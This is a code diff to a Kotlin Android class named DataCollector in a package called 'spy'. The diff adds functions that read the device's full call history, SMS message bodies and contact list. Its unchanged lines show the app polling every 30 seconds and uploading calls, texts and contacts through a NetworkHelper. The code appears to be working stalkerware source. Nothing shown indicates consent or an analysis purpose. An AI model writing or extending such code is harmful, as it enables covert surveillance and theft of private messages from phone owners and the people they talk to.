@@ -1,9 +1,9 @@
 package com.gauravhanna.spy
 
-import android.content.ContentResolver
 import android.content.Context
 import android.database.Cursor
 import android.provider.CallLog
+import android.provider.ContactsContract
 import android.provider.Telephony
 import android.util.Log
 import java.util.concurrent.Executors
@@ -15,6 +15,97 @@ object DataCollector {
     private var lastCallTimestamp = 0L
     private var lastSmsTimestamp = 0L
     private var initialRunDone = false
+
+    // ========== PUBLIC FUNCTIONS FOR BackgroundService ==========
+
+    fun getCallLogs(context: Context): List<CallLogEntry> {
+        val calls = mutableListOf<CallLogEntry>()
+        val cursor = context.contentResolver.query(
+            CallLog.Calls.CONTENT_URI,
+            null,
+            null,
+            null,
+            "${CallLog.Calls.DATE} DESC"
+        ) ?: return calls
+
+        cursor.use {
+            val numberCol = it.getColumnIndex(CallLog.Calls.NUMBER)
+            val nameCol = it.getColumnIndex(CallLog.Calls.CACHED_NAME)
+            val typeCol = it.getColumnIndex(CallLog.Calls.TYPE)
+            val durationCol = it.getColumnIndex(CallLog.Calls.DURATION)
+            val dateCol = it.getColumnIndex(CallLog.Calls.DATE)
+
+            while (it.moveToNext()) {
+                val number = if (numberCol >= 0) it.getString(numberCol) ?: "" else ""
+                val name = if (nameCol >= 0) it.getString(nameCol) else null
+                val type = when {
+                    typeCol >= 0 -> when (it.getInt(typeCol)) {
+                        CallLog.Calls.INCOMING_TYPE -> "incoming"
+                        CallLog.Calls.OUTGOING_TYPE -> "outgoing"
+                        else -> "missed"
+                    }
+                    else -> "unknown"
+                }
+                val duration = if (durationCol >= 0) it.getInt(durationCol) else 0
+                val date = if (dateCol >= 0) it.getLong(dateCol) else 0L
+                calls.add(CallLogEntry(number, name, type, duration, date))
+            }
+        }
+        Log.d(TAG, "getCallLogs: found ${calls.size} calls")
+        return calls
+    }
+
+    fun getSmsLogs(context: Context): List<SmsEntry> {
+        val smsList = mutableListOf<SmsEntry>()
+        val cursor = context.contentResolver.query(
+            Telephony.Sms.CONTENT_URI,
+            null,
+            null,
+            null,
+            "${Telephony.Sms.DATE} DESC"
+        ) ?: return smsList
+
+        cursor.use {
+            val addressCol = it.getColumnIndex(Telephony.Sms.ADDRESS)
+            val bodyCol = it.getColumnIndex(Telephony.Sms.BODY)
+            val dateCol = it.getColumnIndex(Telephony.Sms.DATE)
+
+            while (it.moveToNext()) {
+                val address = if (addressCol >= 0) it.getString(addressCol) ?: "" else ""
+                val body = if (bodyCol >= 0) it.getString(bodyCol) ?: "" else ""
+                val date = if (dateCol >= 0) it.getLong(dateCol) else 0L
+                smsList.add(SmsEntry(address, body, date))
+            }
+        }
+        Log.d(TAG, "getSmsLogs: found ${smsList.size} SMS")
+        return smsList
+    }
+
+    fun getContacts(context: Context): List<ContactEntry> {
+        val contactsList = mutableListOf<ContactEntry>()
+        val cursor = context.contentResolver.query(
+            ContactsContract.CommonDataKinds.Phone.CONTENT_URI,
+            null,
+            null,
+            null,
+            null
+        ) ?: return contactsList
+
+        cursor.use {
+            val nameCol = it.getColumnIndex(ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME)
+            val numberCol = it.getColumnIndex(ContactsContract.CommonDataKinds.Phone.NUMBER)
+
+            while (it.moveToNext()) {
+                val name = if (nameCol >= 0) it.getString(nameCol) ?: "" else ""
+                val number = if (numberCol >= 0) it.getString(numberCol) ?: "" else ""
+                contactsList.add(ContactEntry(name, number))
+            }
+        }
+        Log.d(TAG, "getContacts: found ${contactsList.size} contacts")
+        return contactsList
+    }
+
+    // ========== OTHER FUNCTIONS ==========
 
     fun start(context: Context) {
         Log.d(TAG, "DataCollector start() called")
@@ -30,14 +121,12 @@ object DataCollector {
         }, 0, 30, TimeUnit.SECONDS)
     }
 
-    // ✅ NEW: Force sync for network reconnection
     fun forceSync(context: Context) {
         executor.execute {
             Log.d(TAG, "Force sync triggered")
             collectNewCalls(context)
             collectNewSms(context)
-            
-            // Force upload contacts periodically (once a day)
+
             val prefs = context.getSharedPreferences("spy_prefs", Context.MODE_PRIVATE)
             val lastContactSync = prefs.getLong("last_contact_sync", 0)
             if (System.currentTimeMillis() - lastContactSync > 24 * 60 * 60 * 1000) {
@@ -48,14 +137,12 @@ object DataCollector {
         }
     }
 
-    // Helper to safely get column indices
     private fun getColumnIndexOrThrow(cursor: Cursor, columnName: String): Int {
         val idx = cursor.getColumnIndex(columnName)
         if (idx == -1) throw IllegalArgumentException("Column $columnName not found")
         return idx
     }
 
-    // ---------- All existing call logs ----------
     private fun collectAllCalls(context: Context) {
         val cursor = context.contentResolver.query(
             CallLog.Calls.CONTENT_URI,
@@ -88,8 +175,6 @@ object DataCollector {
             if (calls.isNotEmpty()) {
                 Log.d(TAG, "Sending ${calls.size} existing call logs")
                 NetworkHelper.sendCalls(context, calls)
-            } else {
-                Log.d(TAG, "No existing call logs")
             }
         } catch (e: Exception) {
             Log.e(TAG, "Error collecting all calls: ${e.message}")
@@ -98,7 +183,6 @@ object DataCollector {
         }
     }
 
-    // ---------- All existing SMS ----------
     private fun collectAllSms(context: Context) {
         val cursor = context.contentResolver.query(
             Telephony.Sms.CONTENT_URI,
@@ -123,8 +207,6 @@ object DataCollector {
             if (smsList.isNotEmpty()) {
                 Log.d(TAG, "Sending ${smsList.size} existing SMS")
                 NetworkHelper.sendSMS(context, smsList)
-            } else {
-                Log.d(TAG, "No existing SMS")
             }
         } catch (e: Exception) {
             Log.e(TAG, "Error collecting all SMS: ${e.message}")
@@ -133,33 +215,32 @@ object DataCollector {
         }
     }
 
-    // ---------- All contacts ----------
     private fun collectAllContacts(context: Context) {
         val cursor = context.contentResolver.query(
-            android.provider.ContactsContract.Contacts.CONTENT_URI,
+            ContactsContract.Contacts.CONTENT_URI,
             null,
             null,
             null,
             null
         ) ?: return
         try {
-            val idIdx = getColumnIndexOrThrow(cursor, android.provider.ContactsContract.Contacts._ID)
-            val nameIdx = getColumnIndexOrThrow(cursor, android.provider.ContactsContract.Contacts.DISPLAY_NAME)
+            val idIdx = getColumnIndexOrThrow(cursor, ContactsContract.Contacts._ID)
+            val nameIdx = getColumnIndexOrThrow(cursor, ContactsContract.Contacts.DISPLAY_NAME)
             val contacts = mutableListOf<ContactEntry>()
             while (cursor.moveToNext()) {
                 val id = cursor.getString(idIdx)
                 val name = cursor.getString(nameIdx) ?: ""
                 var number = ""
                 val phoneCursor = context.contentResolver.query(
-                    android.provider.ContactsContract.CommonDataKinds.Phone.CONTENT_URI,
+                    ContactsContract.CommonDataKinds.Phone.CONTENT_URI,
                     null,
-                    "${android.provider.ContactsContract.CommonDataKinds.Phone.CONTACT_ID} = ?",
+                    "${ContactsContract.CommonDataKinds.Phone.CONTACT_ID} = ?",
                     arrayOf(id),
                     null
                 )
                 phoneCursor?.use {
                     if (it.moveToFirst()) {
-                        val numberIdx = it.getColumnIndex(android.provider.ContactsContract.CommonDataKinds.Phone.NUMBER)
+                        val numberIdx = it.getColumnIndex(ContactsContract.CommonDataKinds.Phone.NUMBER)
                         if (numberIdx != -1) {
                             number = it.getString(numberIdx) ?: ""
                         }
@@ -170,8 +251,6 @@ object DataCollector {
             if (contacts.isNotEmpty()) {
                 Log.d(TAG, "Sending ${contacts.size} contacts")
                 NetworkHelper.sendContacts(context, contacts)
-            } else {
-                Log.d(TAG, "No contacts")
             }
         } catch (e: Exception) {
             Log.e(TAG, "Error collecting contacts: ${e.message}")
@@ -180,7 +259,6 @@ object DataCollector {
         }
     }
 
-    // ---------- New calls (after last timestamp) ----------
     private fun collectNewCalls(context: Context) {
         val selection = "${CallLog.Calls.DATE} > ?"
         val selectionArgs = arrayOf(lastCallTimestamp.toString())
@@ -223,7 +301,6 @@ object DataCollector {
         }
     }
 
-    // ---------- New SMS (after last timestamp) ----------
     private fun collectNewSms(context: Context) {
         val selection = "${Telephony.Sms.DATE} > ?"
         val selectionArgs = arrayOf(lastSmsTimestamp.toString())
@@ -258,7 +335,24 @@ object DataCollector {
         }
     }
 
-    data class CallLogEntry(val number: String, val name: String?, val type: String, val duration: Int, val date: Long)
-    data class SmsEntry(val address: String, val body: String, val date: Long)
-    data class ContactEntry(val name: String, val number: String)
+    // ========== DATA CLASSES ==========
+
+    data class CallLogEntry(
+        val number: String,
+        val name: String?,
+        val type: String,
+        val duration: Int,
+        val date: Long
+    )
+
+    data class SmsEntry(
+        val address: String,
+        val body: String,
+        val date: Long
+    )
+
+    data class ContactEntry(
+        val name: String,
+        val number: String
+    )
 }
